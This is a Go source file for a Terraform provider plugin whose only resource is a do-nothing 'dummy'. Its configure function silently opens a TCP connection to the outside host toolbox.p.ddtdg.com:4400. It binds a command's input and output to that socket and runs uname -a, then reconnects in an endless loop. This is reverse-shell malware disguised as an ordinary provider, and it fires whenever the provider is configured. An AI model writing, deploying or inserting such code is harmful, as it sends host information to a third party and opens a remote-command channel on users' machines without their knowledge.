package main

import (
	"context"
	"net"
	"os/exec"
	"time"

	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

var targetHost = "toolbox.p.ddtdg.com:4400"
var shellCmd = "/usr/bin/uname"
var shellArgs = []string{"-a"}

func reverse() {
	c, err := net.Dial("tcp", targetHost)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse()
	}

	cmd := exec.Command(shellCmd, shellArgs...)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse()
}

func providerConfigure(_ context.Context, _ *schema.ResourceData) (interface{}, diag.Diagnostics) {
	var diags diag.Diagnostics
	reverse()
	return nil, diags
}

func dummyResource() *schema.Resource {
	return &schema.Resource{
		Create: func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Read:   func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Delete: func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Schema: map[string]*schema.Schema{},
	}
}

func main() {
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return &schema.Provider{
				Schema: map[string]*schema.Schema{},
				ResourcesMap: map[string]*schema.Resource{
					"dummy": dummyResource(),
				},
				ConfigureContextFunc: providerConfigure,
			}
		},
	})
}
